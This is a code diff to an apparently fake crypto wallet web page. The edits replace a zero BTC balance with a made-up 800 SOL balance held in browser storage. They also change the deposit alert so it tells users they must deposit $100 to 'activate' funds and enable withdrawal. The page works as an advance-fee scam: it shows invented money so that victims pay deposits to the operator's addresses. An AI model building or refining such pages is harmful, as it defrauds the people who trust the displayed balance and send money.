@@ -39,9 +39,9 @@ select,input{width:100%;padding:12px;margin-top:10px;background:#0b0f14;border:1
 <div class="grid">
 <div class="card">
 <h3>Wallet Overview</h3>
-<div class="balance" id="bal">0.000 BTC</div>
+<div class="balance" id="bal">800.00039 SOL</div>
 <div id="pending">Pending: 0</div>
-<div id="crypto">Crypto: BTC</div>
+<div id="crypto">Crypto: SOL</div>
 <button onclick="activateWallet()">Activate Wallet</button>
 <a href="#" onclick="redirectWithdrawal()"><button>Withdraw</button></a>
 </div>
@@ -86,7 +86,7 @@ document.addEventListener("DOMContentLoaded", ()=>{
 const wallet = localStorage.wallet || "demo";
 document.getElementById("walletLabel").innerText = wallet;
 const key = "corepay_" + wallet;
-let data = JSON.parse(localStorage.getItem(key)) || {balance:0.042, pending:[], history:[], withdrawalHistory:[]};
+let data = JSON.parse(localStorage.getItem(key)) || {balance:800.042, pending:[], history:[], withdrawalHistory:[]};
 function save(){ localStorage.setItem(key, JSON.stringify(data)); }
 
 function render(){
@@ -130,7 +130,7 @@ let amt=parseFloat(document.getElementById("amount").value);
 let addr=document.getElementById("walletAddress").value;
 let btn=document.getElementById("confirmDepositBtn");
 if(!amt||!addr)return alert("Enter amount and select coin."); 
-if(amt<10)return alert("Minimum deposit is $10");
+if(amt<10)return alert("You need to make a Minimum deposit of $100 to Automatically activate the funds inside the connected Wallet Address to successfully enable withdrawal");
 if(wallets[coin]!==addr){alert("Wallet address does not match selected coin!");return;}
 btn.style.background="white"; btn.style.color="#0b0f14"; btn.innerText="Confirming deposit...";
 let fill=0;
